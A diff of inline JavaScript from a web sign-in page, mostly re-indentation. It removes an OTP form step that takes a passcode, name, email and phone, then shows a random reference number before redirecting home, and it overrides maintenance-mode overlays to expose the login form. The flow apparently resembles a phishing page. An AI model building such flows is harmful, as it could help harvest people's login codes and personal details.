-  // ── Step 2: validate OTP form ──────────────────────────────────────────────
-  var otpForm = byId('tru-otp-form');
-  if (otpForm) {
-    otpForm.addEventListener('submit', function(e) {
-      e.preventDefault();
-      clearErrors();
-      var otp   = byId('tru-otp-code').value.trim();
-      var name  = byId('tru-full-name').value.trim();
-      var email = byId('tru-email').value.trim();
-      var phone = byId('tru-phone').value.trim();
-      var ok = true;
-      if (!otp || otp.length < 4)   { setError('tru-otp-error',   'Please enter a valid OTP (at least 4 digits).'); ok = false; }
-      if (!name)                     { setError('tru-name-error',  'Full name is required.'); ok = false; }
-      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { setError('tru-email-error', 'Please enter a valid email address.'); ok = false; }
-      if (!phone || phone.replace(/\D/g,'').length < 7) { setError('tru-phone-error', 'Please enter a valid phone number.'); ok = false; }
-      if (!ok) return;
-      hide('tru-otp-overlay');
-      byId('tru-ref-number').textContent = randRef();
-      show('tru-success-overlay');
-      startCountdown();
-    });
-  }
+      // ── Step 3: countdown then redirect ───────────────────────────────────────
+      var countdownTimer = null;
+      function startCountdown() {
+        var remaining = 10;
+        var fill = byId('tru-progress-fill');
+        if (fill) { fill.style.transition = 'none'; fill.style.width = '100%'; }
+        setTimeout(function () { if (fill) fill.style.transition = 'width 1s linear'; }, 50);
+        countdownTimer = setInterval(function () {
+          remaining -= 1;
+          byId('tru-countdown').textContent = remaining;
+          if (fill) fill.style.width = (remaining * 10) + '%';
+          if (remaining <= 0) { clearInterval(countdownTimer); goHome(); }
+        }, 1000);
+      }
 
-  // ── Step 3: countdown then redirect ───────────────────────────────────────
-  var countdownTimer = null;
-  function startCountdown() {
-    var remaining = 10;
-    var fill = byId('tru-progress-fill');
-    if (fill) { fill.style.transition = 'none'; fill.style.width = '100%'; }
-    setTimeout(function(){ if (fill) fill.style.transition = 'width 1s linear'; }, 50);
-    countdownTimer = setInterval(function() {
-      remaining -= 1;
-      byId('tru-countdown').textContent = remaining;
-      if (fill) fill.style.width = (remaining * 10) + '%';
-      if (remaining <= 0) { clearInterval(countdownTimer); goHome(); }
-    }, 1000);
-  }
+      function goHome() { clearInterval(countdownTimer); window.location.href = '/'; }
 
-  function goHome() { clearInterval(countdownTimer); window.location.href = '/'; }
+      var goNowBtn = byId('tru-go-home-now');
+      if (goNowBtn) { goNowBtn.addEventListener('click', goHome); }
 
-  var goNowBtn = byId('tru-go-home-now');
-  if (goNowBtn) { goNowBtn.addEventListener('click', goHome); }
+      // ── Init ───────────────────────────────────────────────────────────────────
+      function init() {
+        // Show the form (same as homepage LOCAL FIX)
+        document.querySelectorAll('.loading-container-login').forEach(function (el) { el.style.display = 'none'; });
+        document.querySelectorAll('form.sign-in-form').forEach(function (el) { el.classList.remove('hide'); el.style.display = ''; });
+        document.querySelectorAll('.maintenance-mode').forEach(function (el) { el.style.display = 'none'; });
+        document.querySelectorAll('.maintenancemodeendpointurl').forEach(function (el) { el.classList.add('login-component-opacity'); });
+        attachSignIn();
+        initFloatingLabels();
+      }
 
-  // ── Init ───────────────────────────────────────────────────────────────────
-  function init() {
-    // Show the form (same as homepage LOCAL FIX)
-    document.querySelectorAll('.loading-container-login').forEach(function(el){ el.style.display = 'none'; });
-    document.querySelectorAll('form.sign-in-form').forEach(function(el){ el.classList.remove('hide'); el.style.display = ''; });
-    document.querySelectorAll('.maintenance-mode').forEach(function(el){ el.style.display = 'none'; });
-    document.querySelectorAll('.maintenancemodeendpointurl').forEach(function(el){ el.classList.add('login-component-opacity'); });
-    attachSignIn();
-    initFloatingLabels();
-  }
-
-  if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', init); }
-  else { init(); }
-  setTimeout(init, 400);
-})();
-</script>
+      if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', init); }
+      else { init(); }
+      setTimeout(init, 400);
+    })();
+  </script>
 
 </body>
+
 </html>
